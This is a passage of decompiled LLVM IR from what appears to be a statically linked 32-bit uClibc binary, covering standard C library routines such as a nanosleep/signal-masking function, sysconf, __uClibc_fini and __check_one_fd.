dec_label_pc_80552ac:                             ; preds = %dec_label_pc_805529e
  store i32 %v2_805524f, i32* %eax.global-to-local, align 4
  store i32 %v2_805524f, i32* %stack_var_-460, align 4
  %v4_80552b8 = call i32 @__sigaddset(i32 %v2_805524f, i32 17, i32 0, i32 0)
  store i32 %v4_80552b8, i32* %eax.global-to-local, align 4
  %v2_80552c0 = icmp slt i32 %v4_80552b8, 0
  br i1 %v2_80552c0, label %dec_label_pc_8055387, label %dec_label_pc_80552c8

dec_label_pc_80552c8:                             ; preds = %dec_label_pc_80552ac
  %v2_80552c9 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_80552c9, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_80552d2 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_80552c9)
  store i32 %v4_80552d2, i32* %eax.global-to-local, align 4
  %v2_80552da = icmp slt i32 %v4_80552d2, 0
  %v1_80552dc = icmp eq i1 %v2_80552da, false
  br i1 %v1_80552dc, label %dec_label_pc_8055306, label %dec_label_pc_80552de

dec_label_pc_80552de:                             ; preds = %dec_label_pc_80552c8
  %v0_80552de = load i32, i32* %stack_var_-460, align 4
  %v1_80552de = call i32 @__errno_location(i32 %v0_80552de)
  store i32 %v1_80552de, i32* %eax.global-to-local, align 4
  %v1_80552e3 = inttoptr i32 %v1_80552de to i32*
  %v2_80552e3 = load i32, i32* %v1_80552e3, align 4
  store i32 %v2_80552e3, i32* @esi, align 4
  store i32 %v1_80552de, i32* @ebx, align 4
  store i32 %v2_8055268, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80552f4 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80552f4 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80552f4, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80552ff = load i32, i32* @esi, align 4
  %v1_80552ff = load i32, i32* @ebx, align 4
  %v2_80552ff = inttoptr i32 %v1_80552ff to i32*
  store i32 %v0_80552ff, i32* %v2_80552ff, align 4
  %v0_8055394.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805538a

dec_label_pc_8055306:                             ; preds = %dec_label_pc_80552c8
  %v3_8055306 = load i32, i32* %stack_var_-420, align 4
  %v12_8055306 = icmp eq i32 %v3_8055306, 1
  %v2_8055312 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8055312, i32* @ebx, align 4
  %v1_8055319 = icmp eq i1 %v12_8055306, false
  br i1 %v1_8055319, label %dec_label_pc_8055340, label %dec_label_pc_805531b

dec_label_pc_805531b:                             ; preds = %dec_label_pc_8055306
  %v0_805531b = load i32, i32* @edi, align 4
  store i32 %v2_8055312, i32* %stack_var_-460, align 4
  %v4_805531f = bitcast i32* %stack_var_-24 to %timespec*
  %v5_805531f = call i32 @__libc_nanosleep(%timespec* %v4_805531f, i32 %v2_8055312, i32 %v0_805531b, i32 %v0_805531b)
  store i32 %v5_805531f, i32* %eax.global-to-local, align 4
  store i32 %v5_805531f, i32* @edi, align 4
  %v1_8055326 = call i32 @__errno_location(i32 %v2_8055312)
  store i32 %v1_8055326, i32* %eax.global-to-local, align 4
  %v1_805532e = inttoptr i32 %v1_8055326 to i32*
  %v2_805532e = load i32, i32* %v1_805532e, align 4
  store i32 %v2_805532e, i32* @esi, align 4
  store i32 %v1_8055326, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8055337 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8055337 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8055337, i32 0)
  store i32 %v4_8055337, i32* %eax.global-to-local, align 4
  %v0_805533c = load i32, i32* @esi, align 4
  %v1_805533c = load i32, i32* @ebx, align 4
  %v2_805533c = inttoptr i32 %v1_805533c to i32*
  store i32 %v0_805533c, i32* %v2_805533c, align 4
  %v0_8055366.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8055363

dec_label_pc_8055340:                             ; preds = %dec_label_pc_8055306
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8055346 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8055346 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8055346, i32 0)
  store i32 %v4_8055346, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805535c

dec_label_pc_8055351:                             ; preds = %dec_label_pc_8055283
  %v2_8055353 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8055353, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805535c

dec_label_pc_805535c:                             ; preds = %dec_label_pc_8055340, %dec_label_pc_8055351
  %storemerge3.pre-phi = phi i32 [ %v2_8055312, %dec_label_pc_8055340 ], [ %v2_8055353, %dec_label_pc_8055351 ]
  %v3_805535c = phi i32 [ %v2_8055268, %dec_label_pc_8055340 ], [ %v4_8055288, %dec_label_pc_8055351 ]
  %v2_805535c = phi i32 [ 0, %dec_label_pc_8055340 ], [ %v4_8055288, %dec_label_pc_8055351 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_805535c = bitcast i32* %stack_var_-24 to %timespec*
  %v5_805535c = call i32 @__libc_nanosleep(%timespec* %v4_805535c, i32 %storemerge3.pre-phi, i32 %v2_805535c, i32 %v3_805535c)
  store i32 %v5_805535c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055363

dec_label_pc_8055363:                             ; preds = %dec_label_pc_805531b, %dec_label_pc_805535c
  %v0_8055366 = phi i32 [ %v0_8055366.pre, %dec_label_pc_805531b ], [ %v5_805535c, %dec_label_pc_805535c ]
  %v1_8055366 = icmp eq i32 %v0_8055366, 0
  br i1 %v1_8055366, label %dec_label_pc_8055383, label %dec_label_pc_805536a

dec_label_pc_805536a:                             ; preds = %dec_label_pc_8055363
  %v4_805537a = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_805537a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805538a

dec_label_pc_8055383:                             ; preds = %entry, %dec_label_pc_8055363
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805538a

dec_label_pc_8055387:                             ; preds = %dec_label_pc_80552ac, %dec_label_pc_8055267, %dec_label_pc_8055239
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805538a

dec_label_pc_805538a:                             ; preds = %dec_label_pc_8055383, %dec_label_pc_805536a, %dec_label_pc_80552de, %dec_label_pc_8055387
  %v0_8055394 = phi i32 [ 0, %dec_label_pc_8055383 ], [ %v4_805537a, %dec_label_pc_805536a ], [ %v0_8055394.pre, %dec_label_pc_80552de ], [ -1, %dec_label_pc_8055387 ]
  store i32 %v0_8055214, i32* @ebx, align 4
  store i32 %v0_8055213, i32* @esi, align 4
  store i32 %v0_8055212, i32* @edi, align 4
  store i32 %v0_805520c, i32* @ebp, align 4
  ret i32 %v0_8055394

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8055326, { 1, 0, 2 }
  uselistorder i32 %v2_8055312, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_80552a9, { 2, 1, 0 }
  uselistorder i32 %v4_8055288, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8055268, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_805524f, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8055236, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805538a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8055383, { 1, 0 }
  uselistorder label %dec_label_pc_8055363, { 1, 0 }
  uselistorder label %dec_label_pc_805535c, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_80553b7 [
    i32 0, label %dec_label_pc_80553c7
    i32 1, label %dec_label_pc_80554ac
    i32 2, label %dec_label_pc_80553d1
    i32 3, label %dec_label_pc_80553db
    i32 4, label %dec_label_pc_80553e5
    i32 5, label %dec_label_pc_805547b
    i32 6, label %dec_label_pc_80553ed
    i32 7, label %dec_label_pc_80553ad
    i32 8, label %dec_label_pc_80553ad
    i32 9, label %dec_label_pc_80553ad
    i32 10, label %dec_label_pc_80553ad
    i32 11, label %dec_label_pc_80553ad
    i32 12, label %dec_label_pc_80553ad
    i32 13, label %dec_label_pc_80553ad
    i32 14, label %dec_label_pc_80553ad
    i32 15, label %dec_label_pc_80553ad
    i32 16, label %dec_label_pc_80553ad
    i32 17, label %dec_label_pc_80553ad
    i32 18, label %dec_label_pc_80553ad
    i32 19, label %dec_label_pc_80553ad
    i32 20, label %dec_label_pc_80553ad
    i32 21, label %dec_label_pc_80553ad
    i32 22, label %dec_label_pc_80553ad
    i32 23, label %dec_label_pc_80554ac
    i32 24, label %dec_label_pc_80554ac
    i32 25, label %dec_label_pc_80554b8
    i32 26, label %dec_label_pc_8055489
    i32 27, label %dec_label_pc_80554ac
    i32 28, label %dec_label_pc_80553ff
    i32 29, label %dec_label_pc_8055482
    i32 30, label %dec_label_pc_80553f7
    i32 31, label %dec_label_pc_8055497
    i32 32, label %dec_label_pc_80554ac
    i32 33, label %dec_label_pc_80554ac
    i32 34, label %dec_label_pc_80554ac
    i32 35, label %dec_label_pc_8055490
    i32 36, label %dec_label_pc_80554bf
    i32 37, label %dec_label_pc_80554c6
    i32 38, label %dec_label_pc_80554bf
    i32 39, label %dec_label_pc_8055409
    i32 40, label %dec_label_pc_80554cd
    i32 41, label %dec_label_pc_80554ac
    i32 42, label %dec_label_pc_8055497
    i32 43, label %dec_label_pc_80554c6
    i32 44, label %dec_label_pc_80554d4
    i32 45, label %dec_label_pc_80554c6
    i32 46, label %dec_label_pc_8055482
    i32 47, label %dec_label_pc_8055482
    i32 48, label %dec_label_pc_8055482
    i32 49, label %dec_label_pc_80554ac
    i32 50, label %dec_label_pc_80554ac
    i32 51, label %dec_label_pc_8055482
    i32 52, label %dec_label_pc_8055482
    i32 53, label %dec_label_pc_80554ac
    i32 54, label %dec_label_pc_80554ac
    i32 55, label %dec_label_pc_80554ac
    i32 56, label %dec_label_pc_80554ac
    i32 57, label %dec_label_pc_80554ac
    i32 58, label %dec_label_pc_80554ac
    i32 59, label %dec_label_pc_80554ac
    i32 60, label %dec_label_pc_80554ac
    i32 61, label %dec_label_pc_80554ac
    i32 62, label %dec_label_pc_80554ac
    i32 63, label %dec_label_pc_80554ac
    i32 64, label %dec_label_pc_80554ac
    i32 65, label %dec_label_pc_80554ac
    i32 66, label %dec_label_pc_80554ac
    i32 67, label %dec_label_pc_80553ad
    i32 68, label %dec_label_pc_80553ad
    i32 69, label %dec_label_pc_8055490
    i32 70, label %dec_label_pc_8055490
    i32 71, label %dec_label_pc_8055490
    i32 72, label %dec_label_pc_8055497
    i32 73, label %dec_label_pc_805549e
    i32 74, label %dec_label_pc_80554a5
    i32 75, label %dec_label_pc_8055413
    i32 76, label %dec_label_pc_80554a5
    i32 77, label %dec_label_pc_80553ad
    i32 78, label %dec_label_pc_80553ad
    i32 79, label %dec_label_pc_80553ad
    i32 80, label %dec_label_pc_80553ad
    i32 81, label %dec_label_pc_80553ad
    i32 82, label %dec_label_pc_80553ad
    i32 83, label %dec_label_pc_80553ad
    i32 84, label %dec_label_pc_80553ad
    i32 85, label %dec_label_pc_80554ac
    i32 86, label %dec_label_pc_80554ac
    i32 87, label %dec_label_pc_8055489
    i32 88, label %dec_label_pc_805541d
    i32 89, label %dec_label_pc_8055427
    i32 90, label %dec_label_pc_805549e
    i32 91, label %dec_label_pc_80553ad
    i32 92, label %dec_label_pc_80553ad
    i32 93, label %dec_label_pc_80553ad
    i32 94, label %dec_label_pc_80553ad
    i32 95, label %dec_label_pc_8055482
    i32 96, label %dec_label_pc_80554ac
    i32 97, label %dec_label_pc_80554ac
    i32 98, label %dec_label_pc_80553ad
    i32 99, label %dec_label_pc_80553ad
    i32 100, label %dec_label_pc_80553ad
    i32 101, label %dec_label_pc_8055431
    i32 102, label %dec_label_pc_8055474
    i32 103, label %dec_label_pc_80554b1
    i32 104, label %dec_label_pc_8055489
    i32 105, label %dec_label_pc_805543b
    i32 106, label %dec_label_pc_8055497
    i32 107, label %dec_label_pc_8055497
    i32 108, label %dec_label_pc_805547b
    i32 109, label %dec_label_pc_80554b8
    i32 110, label %dec_label_pc_80554d4
    i32 111, label %dec_label_pc_8055474
    i32 112, label %dec_label_pc_80554b1
    i32 113, label %dec_label_pc_80554d4
    i32 114, label %dec_label_pc_8055445
    i32 115, label %dec_label_pc_80554cd
    i32 116, label %dec_label_pc_80554ac
    i32 117, label %dec_label_pc_80554ac
    i32 118, label %dec_label_pc_805544f
    i32 119, label %dec_label_pc_8055459
    i32 120, label %dec_label_pc_80554c6
    i32 121, label %dec_label_pc_8055489
    i32 122, label %dec_label_pc_8055489
    i32 123, label %dec_label_pc_8055489
    i32 124, label %dec_label_pc_8055489
    i32 125, label %dec_label_pc_80553ad
    i32 126, label %dec_label_pc_80553ad
    i32 127, label %dec_label_pc_80554ac
    i32 128, label %dec_label_pc_80554ac
    i32 129, label %dec_label_pc_80553ad
    i32 130, label %dec_label_pc_80553ad
    i32 131, label %dec_label_pc_80554ac
    i32 149, label %dec_label_pc_8055460
  ]

dec_label_pc_80553ad:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80554d9

dec_label_pc_80553b7:                             ; preds = %entry
  %v1_80553b7 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_80553bc = inttoptr i32 %v1_80553b7 to i32*
  store i32 22, i32* %v1_80553bc, align 4
  br label %dec_label_pc_80554ac

dec_label_pc_80553c7:                             ; preds = %entry
  br label %dec_label_pc_80554d9

dec_label_pc_80553d1:                             ; preds = %entry
  br label %dec_label_pc_80554d9

dec_label_pc_80553db:                             ; preds = %entry
  br label %dec_label_pc_80554d9

dec_label_pc_80553e5:                             ; preds = %entry
  %v1_80553e8 = call i32 @getdtablesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80553ed

dec_label_pc_80553ed:                             ; preds = %entry, %dec_label_pc_80553e5
  br label %dec_label_pc_80554d9

dec_label_pc_80553f7:                             ; preds = %entry
  %v0_80553fa = call i32 @__GI_getpagesize()
  br label %dec_label_pc_80553ff

dec_label_pc_80553ff:                             ; preds = %entry, %dec_label_pc_80553f7
  br label %dec_label_pc_80554d9

dec_label_pc_8055409:                             ; preds = %entry
  br label %dec_label_pc_80554d9

dec_label_pc_8055413:                             ; preds = %entry
  br label %dec_label_pc_80554d9

dec_label_pc_805541d:                             ; preds = %entry
  br label %dec_label_pc_80554d9

dec_label_pc_8055427:                             ; preds = %entry
  br label %dec_label_pc_80554d9

dec_label_pc_8055431:                             ; preds = %entry
  br label %dec_label_pc_80554d9

dec_label_pc_805543b:                             ; preds = %entry
  br label %dec_label_pc_80554d9

dec_label_pc_8055445:                             ; preds = %entry
  br label %dec_label_pc_80554d9

dec_label_pc_805544f:                             ; preds = %entry
  br label %dec_label_pc_80554d9

dec_label_pc_8055459:                             ; preds = %entry
  br label %dec_label_pc_80554d9

dec_label_pc_8055460:                             ; preds = %entry
  %v5_8055466 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_805546e = icmp slt i32 %v5_8055466, 0
  %v1_8055470 = icmp eq i1 %v2_805546e, false
  br i1 %v1_8055470, label %dec_label_pc_8055482, label %dec_label_pc_80554ac

dec_label_pc_8055474:                             ; preds = %entry, %entry
  br label %dec_label_pc_80554d9

dec_label_pc_805547b:                             ; preds = %entry, %entry
  br label %dec_label_pc_80554d9

dec_label_pc_8055482:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8055460
  br label %dec_label_pc_80554d9

dec_label_pc_8055489:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80554d9

dec_label_pc_8055490:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_80554d9

dec_label_pc_8055497:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80554d9

dec_label_pc_805549e:                             ; preds = %entry, %entry
  br label %dec_label_pc_80554d9

dec_label_pc_80554a5:                             ; preds = %entry, %entry
  br label %dec_label_pc_80554d9

dec_label_pc_80554ac:                             ; preds = %dec_label_pc_8055460, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_80553b7
  br label %dec_label_pc_80554d9

dec_label_pc_80554b1:                             ; preds = %entry, %entry
  br label %dec_label_pc_80554d9

dec_label_pc_80554b8:                             ; preds = %entry, %entry
  br label %dec_label_pc_80554d9

dec_label_pc_80554bf:                             ; preds = %entry, %entry
  br label %dec_label_pc_80554d9

dec_label_pc_80554c6:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_80554d9

dec_label_pc_80554cd:                             ; preds = %entry, %entry
  br label %dec_label_pc_80554d9

dec_label_pc_80554d4:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_80554d9

dec_label_pc_80554d9:                             ; preds = %dec_label_pc_80554cd, %dec_label_pc_80554c6, %dec_label_pc_80554bf, %dec_label_pc_80554b8, %dec_label_pc_80554b1, %dec_label_pc_80554a5, %dec_label_pc_805549e, %dec_label_pc_8055497, %dec_label_pc_8055490, %dec_label_pc_8055489, %dec_label_pc_805547b, %dec_label_pc_8055474, %dec_label_pc_8055482, %dec_label_pc_8055459, %dec_label_pc_805544f, %dec_label_pc_8055445, %dec_label_pc_805543b, %dec_label_pc_8055431, %dec_label_pc_8055427, %dec_label_pc_805541d, %dec_label_pc_8055413, %dec_label_pc_8055409, %dec_label_pc_80553ff, %dec_label_pc_80553ed, %dec_label_pc_80553db, %dec_label_pc_80553d1, %dec_label_pc_80553c7, %dec_label_pc_80553ad, %dec_label_pc_80554ac, %dec_label_pc_80554d4
  %v0_80554dc = phi i32 [ 255, %dec_label_pc_80554cd ], [ 2048, %dec_label_pc_80554c6 ], [ 99, %dec_label_pc_80554bf ], [ 20, %dec_label_pc_80554b8 ], [ -128, %dec_label_pc_80554b1 ], [ 1024, %dec_label_pc_80554a5 ], [ 4, %dec_label_pc_805549e ], [ 32, %dec_label_pc_8055497 ], [ 256, %dec_label_pc_8055490 ], [ 2147483647, %dec_label_pc_8055489 ], [ 16, %dec_label_pc_805547b ], [ 127, %dec_label_pc_8055474 ], [ 200112, %dec_label_pc_8055482 ], [ 9, %dec_label_pc_8055459 ], [ 65535, %dec_label_pc_805544f ], [ -32768, %dec_label_pc_8055445 ], [ -2147483648, %dec_label_pc_805543b ], [ 8, %dec_label_pc_8055431 ], [ 500, %dec_label_pc_8055427 ], [ 4096, %dec_label_pc_805541d ], [ 16384, %dec_label_pc_8055413 ], [ 1000, %dec_label_pc_8055409 ], [ 32768, %dec_label_pc_80553ff ], [ 6, %dec_label_pc_80553ed ], [ 65536, %dec_label_pc_80553db ], [ 100, %dec_label_pc_80553d1 ], [ 131072, %dec_label_pc_80553c7 ], [ 1, %dec_label_pc_80553ad ], [ -1, %dec_label_pc_80554ac ], [ 32767, %dec_label_pc_80554d4 ]
  ret i32 %v0_80554dc

; uselistorder directives
  uselistorder i32 1000, { 2, 0, 1, 3 }
  uselistorder i32 16384, { 0, 10, 5, 6, 7, 8, 9, 4, 1, 2, 3 }
  uselistorder i32 -2147483648, { 4, 6, 7, 3, 5, 9, 0, 1, 2, 8 }
  uselistorder i32 (i32)* @getdtablesize, { 3, 2, 1, 0 }
  uselistorder i32 149, { 2, 1, 3, 0 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 125, { 1, 0 }
  uselistorder i32 124, { 2, 1, 0 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 122, { 1, 0 }
  uselistorder i32 121, { 1, 0 }
  uselistorder i32 119, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 1, 0 }
  uselistorder i32 115, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 111, { 1, 0 }
  uselistorder i32 110, { 2, 0, 1 }
  uselistorder i32 109, { 1, 0 }
  uselistorder i32 108, { 1, 0 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 105, { 1, 0 }
  uselistorder i32 103, { 1, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 98, { 1, 0 }
  uselistorder i32 96, { 1, 0 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 93, { 1, 0 }
  uselistorder i32 92, { 1, 0 }
  uselistorder i32 91, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 89, { 1, 0 }
  uselistorder i32 87, { 1, 2, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 85, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 82, { 1, 0 }
  uselistorder i32 81, { 1, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 78, { 1, 0 }
  uselistorder i32 77, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 74, { 1, 0 }
  uselistorder i32 73, { 1, 0 }
  uselistorder i32 71, { 1, 0 }
  uselistorder i32 70, { 2, 3, 1, 0 }
  uselistorder i32 66, { 1, 0 }
  uselistorder i32 65, { 3, 0, 1, 2 }
  uselistorder i32 63, { 1, 2, 0 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 1, 0 }
  uselistorder i32 50, { 2, 0, 1 }
  uselistorder i32 49, { 2, 1, 0 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 39, { 3, 1, 2, 0 }
  uselistorder i32 38, { 2, 3, 1, 0 }
  uselistorder i32 30, { 7, 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 26, { 3, 2, 0, 1 }
  uselistorder i32 25, { 1, 0 }
  uselistorder i32 23, { 1, 2, 0 }
  uselistorder i32 19, { 2, 1, 3, 0 }
  uselistorder i32 18, { 1, 0 }
  uselistorder label %dec_label_pc_80554d9, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_80554ac, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8055482, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80553ff, { 1, 0 }
  uselistorder label %dec_label_pc_80553ed, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80554e0 = load i32, i32* @ebx, align 4
  store i32 %v0_80554e0, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805f000.994 to i32), i32 -134606848), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805f000.994 to i32), i32 -134606848), i32 2), i32 0), label %dec_label_pc_80554f4, label %dec_label_pc_8055501

dec_label_pc_80554f4:                             ; preds = %entry, %dec_label_pc_80554f4
  %v1_80554fb8 = phi i32 [ %v1_80554fb, %dec_label_pc_80554f4 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805f000.994 to i32), i32 -134606848), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_80554fb.995 to i32), i32* %stack_var_-16, align 4
  %v5_80554f4 = mul i32 %v1_80554fb8, 4
  %v6_80554f4 = add i32 %v5_80554f4, ptrtoint (i32* @global_var_805f000.994 to i32)
  %v7_80554f4 = inttoptr i32 %v6_80554f4 to i32*
  %v8_80554f4 = load i32, i32* %v7_80554f4, align 4
  call void @__pseudo_call(i32 %v8_80554f4)
  %v0_80554fb.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80554fb = add i32 %v0_80554fb.pre, -1
  store i32 %v1_80554fb, i32* %ebx.global-to-local, align 4
  %v10_80554fc = icmp eq i32 %v0_80554fb.pre, 0
  %v1_80554ff = icmp eq i1 %v10_80554fc, false
  br i1 %v1_80554ff, label %dec_label_pc_80554f4, label %dec_label_pc_8055501

dec_label_pc_8055501:                             ; preds = %dec_label_pc_80554f4, %entry
  %v0_8055501 = load i32, i32* @global_var_8065734.996, align 4
  %v1_8055506 = icmp eq i32 %v0_8055501, 0
  br i1 %v1_8055506, label %dec_label_pc_805550c, label %dec_label_pc_805550a

dec_label_pc_805550a:                             ; preds = %dec_label_pc_8055501
  %v0_805550a = load i32, i32* %stack_var_-16, align 4
  %v1_805550a = call i32 @unknown_0(i32 %v0_805550a)
  br label %dec_label_pc_805550c

dec_label_pc_805550c:                             ; preds = %dec_label_pc_805550a, %dec_label_pc_8055501
  %v0_805550c = load i32, i32* @global_var_8065738.997, align 8
  %v1_8055512 = icmp eq i32 %v0_805550c, 0
  br i1 %v1_8055512, label %dec_label_pc_805551b, label %dec_label_pc_8055516

dec_label_pc_8055516:                             ; preds = %dec_label_pc_805550c
  %v2_8055516 = load i32, i32* %stack_var_-16, align 4
  %v1_8055519 = call i32 @unknown_0(i32 %v2_8055516)
  br label %dec_label_pc_805551b

dec_label_pc_805551b:                             ; preds = %dec_label_pc_8055516, %dec_label_pc_805550c
  %v2_805551b = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_805551b

; uselistorder directives
  uselistorder i32 %v1_80554fb, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80554f4, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8055522 = load i32, i32* @eax, align 4
  ret i32 %v0_8055522
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8055523 = load i32, i32* @esi, align 4
  %v0_8055524 = load i32, i32* @eax, align 4
  store i32 %v0_8055524, i32* @esi, align 4
  %v0_8055526 = load i32, i32* @ebx, align 4
  store i32 %v0_8055526, i32* %stack_var_-8, align 4
  %v0_8055527 = load i32, i32* @edx, align 4
  store i32 %v0_8055527, i32* @ebx, align 4
  %v4_805552f = call i32 @__libc_fcntl(i32 %v0_8055524, i32 1, i32 %tmp6)
  %v8_8055537 = icmp eq i32 %v4_805552f, -1
  %v1_8055538 = icmp eq i1 %v8_8055537, false
  br i1 %v1_8055538, label %dec_label_pc_8055553, label %dec_label_pc_805553a

dec_label_pc_805553a:                             ; preds = %entry
  %v0_805553c = load i32, i32* @ebx, align 4
  %v5_8055542 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805ea6c.998, i32 0, i32 0), i32 %v0_805553c)
  %v1_805554a = load i32, i32* @esi, align 4
  %v12_805554a = icmp eq i32 %v5_8055542, %v1_805554a
  br i1 %v12_805554a, label %dec_label_pc_8055553, label %dec_label_pc_805554e

dec_label_pc_805554e:                             ; preds = %dec_label_pc_805553a
  %v0_805554e = call i32 @abort()
  br label %dec_label_pc_8055553

